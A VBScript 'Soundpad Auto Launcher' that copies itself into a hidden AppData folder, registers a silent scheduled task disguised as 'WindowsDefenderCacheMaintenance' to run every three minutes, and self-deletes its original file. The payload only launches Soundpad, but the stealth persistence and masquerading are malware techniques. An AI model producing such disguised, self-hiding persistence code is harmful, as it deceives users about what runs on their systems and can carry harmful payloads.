Option Explicit

' ===================================================================
' Soundpad Auto Launcher (self-deploying)
'
'  Modes:
'   1) Started from original location (setup) -> copies itself into a
'      hidden folder, registers a task for the copy, finds Soundpad,
'      deletes the original file.
'   2) Started from the hidden folder (worker) -> finds and launches
'      Soundpad, does not re-create anything.
'
'  The task is only created if it doesn't exist yet.
' ===================================================================

Const TASK_NAME     = "WindowsDefenderCacheMaintenance"
Const INTERVAL_MIN  = 3
Const DEPLOY_NAME   = "winhelper.vbs"

Dim fso, shell, scriptPath
Set fso   = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

scriptPath = WScript.ScriptFullName

' --- Deployment target ---------------------------------------------
Dim deployDir, deployedPath
deployDir    = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
deployedPath = deployDir & "\" & DEPLOY_NAME

' --- Determine mode ------------------------------------------------
If LCase(scriptPath) = LCase(deployedPath) Then
    ' We are the deployed copy (worker). Do the work and exit.
    SearchAndLaunchSoundpad()
    WScript.Quit
End If

' ===================================================================
' Installer branch
' ===================================================================

' 1. Ensure the target folder exists
If Not fso.FolderExists(deployDir) Then
    On Error Resume Next
    fso.CreateFolder deployDir
    On Error GoTo 0
End If

' 2. Copy itself
On Error Resume Next
fso.CopyFile scriptPath, deployedPath, True
If Err.Number <> 0 Then
    WScript.Quit
End If
On Error GoTo 0

' 3. Hide the copy (best-effort)
On Error Resume Next
Dim f
Set f = fso.GetFile(deployedPath)
f.Attributes = f.Attributes Or 2
On Error GoTo 0

' 4. Check if the task already exists
Dim taskExists
taskExists = False
On Error Resume Next
Dim execObj
Set execObj = shell.Exec("schtasks /query /tn """ & TASK_NAME & """")
If Err.Number = 0 Then
    If execObj.ExitCode = 0 Then taskExists = True
End If
On Error GoTo 0

' 5. Create the task if it doesn't exist yet
If Not taskExists Then
    Dim cmd
    cmd = "schtasks /create /tn """ & TASK_NAME & """ " & _
          "/tr ""wscript.exe //B //Nologo \""" & deployedPath & "\"""" " & _
          "/sc minute /mo " & INTERVAL_MIN & " /f"
    On Error Resume Next
    shell.Run cmd, 0, True
    On Error GoTo 0
End If

' 6. Do the actual work right away
SearchAndLaunchSoundpad()

' 7. Self-delete the original file
On Error Resume Next
shell.Run "cmd /c ping 127.0.0.1 -n 3 >nul & del /f /q """ & scriptPath & """", 0, False
On Error GoTo 0

WScript.Quit

' ===================================================================
' Find and launch Soundpad
' ===================================================================
Sub SearchAndLaunchSoundpad()
    Dim searchFolders, i, foundPath
    searchFolders = Array( _
        "C:\Program Files (x86)\Steam\steamapps\common\Soundpad", _
        "C:\Program Files\Steam\steamapps\common\Soundpad", _
        "C:\Program Files\Soundpad" _
    )

    foundPath = ""
    For i = 0 To UBound(searchFolders)
        If fso.FolderExists(searchFolders(i)) Then
            foundPath = FindFileRecursive(searchFolders(i), "Soundpad.exe")
            If foundPath <> "" Then Exit For
        End If
    Next

    If foundPath = "" Then Exit Sub

    Dim wmi, procs
    On Error Resume Next
    Set wmi   = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='Soundpad.exe'")
    If procs.Count = 0 Then
        shell.Run """" & foundPath & """", 1, False
    End If
    On Error GoTo 0
End Sub

' ===================================================================
' Recursive file search
' ===================================================================
Function FindFileRecursive(folderPath, fileName)
    Dim folder, subFolder, file, result
    result = ""

    On Error Resume Next
    Set folder = fso.GetFolder(folderPath)
    If Err.Number <> 0 Then
        FindFileRecursive = ""
        Exit Function
    End If
    On Error GoTo 0

    For Each file In folder.Files
        If LCase(file.Name) = LCase(fileName) Then
            FindFileRecursive = file.Path
            Exit Function
        End If
    Next

    For Each subFolder In folder.SubFolders
        result = FindFileRecursive(subFolder.Path, fileName)
        If result <> "" Then
            FindFileRecursive = result
            Exit Function
        End If
    Next

    FindFileRecursive = ""
End Function
